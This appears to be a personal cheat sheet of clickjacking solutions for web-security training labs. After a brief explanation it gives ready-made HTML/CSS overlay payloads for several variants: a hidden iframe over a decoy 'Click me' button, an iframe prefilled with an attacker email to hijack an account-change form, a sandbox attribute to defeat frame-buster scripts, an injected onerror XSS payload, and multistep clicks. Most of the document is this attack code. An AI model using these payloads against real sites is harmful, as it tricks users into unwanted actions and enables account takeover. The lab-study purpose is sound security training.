# Clickjacking (UI redressing)

## Description
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content 
on a hidden website by clicking on some other content in a decoy website. Consider the following example:
A web user accesses a decoy website (perhaps this is a link provided by an email) and 
clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative 
hidden button and this results in the payment of an account on another site. This is an example of 
a clickjacking attack. The technique depends upon the incorporation of an invisible, actionable web page
(or multiple pages) containing a button or hidden link, say, within an iframe. The iframe is overlaid on top of 
the user's anticipated decoy web page content. This attack differs from a CSRF attack in 
that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without 
the user's knowledge or input.

##IMPORTANT
```
For the submitted attack a value of 0.0001 will work.
```

### Basic clickjacking with CSRF token protection

Create a fake div, which stands above the original one, in order to make wrongly click to the user to an url or a button.
opacity: 0.1 (visible) -> opacity 0.000001 invisible

adjust the value, how you prefer

<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="$url"></iframe>


---------------------------------------------------------------------------------
### Clickjacking with form input data prefilled from a URL parameter

In case you want to change the email 
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="$url?email=hacker@attacker-website.com"></iframe>



### Clickjacking with a frame buster script

In case you are facing a frame buster, which block the request, try

```
<iframe sandbox="allow-forms" src=$url>, example below
```
 the use of the sandbox="allow-forms" attribute that neutralizes the frame buster script.
```
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;->000000.1 to work most of the times
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0acc008904f6ea01c03e432d0013002a.web-security-academy.net/my-account?email=sample@gmail.com"></iframe>
```

## Exploiting clickjacking vulnerability to trigger DOM-based XSS
In case you want to trigger a DOM event to  cause an error and fire print() or more

```
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:610px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a8d0097031ca50bc07c037f0081008c.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## Multistep clickjacking

In case you need two click due to control clickjacking, you can use two or more divs and place them correctly
Example

```
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    .firstClick {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
.secondClick {
        position:absolute;
        top:290px;
        left:200px;
        z-index: 1;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a5400c10360615dc0398ed400f60004.web-security-academy.net/my-account"></iframe>
```
